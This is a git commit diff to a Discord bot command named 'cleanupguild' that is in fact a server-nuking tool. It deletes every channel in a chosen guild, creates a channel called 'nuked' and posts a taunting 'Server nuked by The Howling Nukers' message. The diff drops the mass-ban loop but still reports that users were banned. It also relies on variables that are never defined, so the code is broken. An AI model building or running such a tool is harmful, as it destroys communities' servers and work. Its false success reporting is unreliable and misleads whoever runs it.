22833f783eab4046f10df2864353793d005820b1
Blizzard the Wolf <60931830+BlizzardTheWolf@users.noreply.github.com>
2023-10-28 17:46:55 +0200

    Update cleanupguild.py

--- antinike/cleanupguild.py
+++ antinike/cleanupguild.py
@@ -11,9 +11,9 @@ class CleanupGuild(commands.Cog):
     async def cleanupguild(self, ctx, guild_id: int, ban_users: bool):
         """
         Cleanup the specified guild by:
-        1. Banning all users (if ban_users is True)
+        1. Banning all users (excluding bots) if ban_users is True
         2. Removing all channels and categories
-        3. Adding one category and channel with the default names
+        3. Adding one category and channel with the specified names
         4. Sending a cleanup message in the new channel
         """
         guild = self.bot.get_guild(guild_id)
@@ -23,50 +23,41 @@ class CleanupGuild(commands.Cog):
 
         bot_user = guild.get_member(self.bot.user.id)
 
-        if ban_users:
-            # Ban all users (excluding bots) and log the actions
-            for member in guild.members:
-                if member != bot_user and not member.bot:
-                    try:
-                        await member.ban(reason="CleanupGuild command")
-                        await ctx.send(f"Banned user: {member.display_name}")
-                    except discord.errors.Forbidden:
-                        continue  # Continue to the next user if missing permissions
-
         renamed_channels = 0
 
-        # Remove all channels and categories and log the actions
         for channel in guild.channels:
-            if isinstance(channel, discord.CategoryChannel):
-                continue  # Skip categories
             try:
                 await channel.delete()
                 renamed_channels += 1
                 await ctx.send(f"Deleted channel: {channel.name}")
             except discord.errors.Forbidden:
                 # If deleting is not possible, rename the channel
-                try:
-                    await channel.edit(name="general")
-                    await ctx.send(f"Renamed channel: {channel.name} to general")
-                except discord.errors.Forbidden:
+                if ban_users:
+                    await channel.edit(name=channel_title)
+                    await ctx.send(f"Renamed channel: {channel.name} to {channel_title}")
+                else:
                     await ctx.send(f"Skipped channel: {channel.name} (no delete/rename permissions)")
-                    continue  # Skip this channel, as it can't be renamed or deleted
 
         # Add one category with the specified name
-        category = await guild.create_category("Howling nukers")
+        category = await guild.create_category(category_title)
         await ctx.send(f"Created category: {category.name}")
 
         # Add one text channel inside the category
-        channel = await guild.create_text_channel("nuked", category=category)
+        channel = await guild.create_text_channel(channel_title, category=category)
         await ctx.send(f"Created text channel: {channel.name}")
 
         # Send a cleanup message in the new channel
-        await channel.send("Server nuked by The Howling Nukers. **Awoooooooo**")
+        await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")
 
         # Output message detailing the actions
+        if ban_users:
+            action_message = "Banned users (excluding bots)."
+        else:
+            action_message = "Did not ban users (excluding bots) because `ban_users` is set to `False`."
+
         output_message = (
             f"Renamed channels: **{renamed_channels}**\n"
-            f"Banned users (excluding bots) if ban_users is True."
+            f"{action_message}"
         )
 
         await ctx.send(output_message)
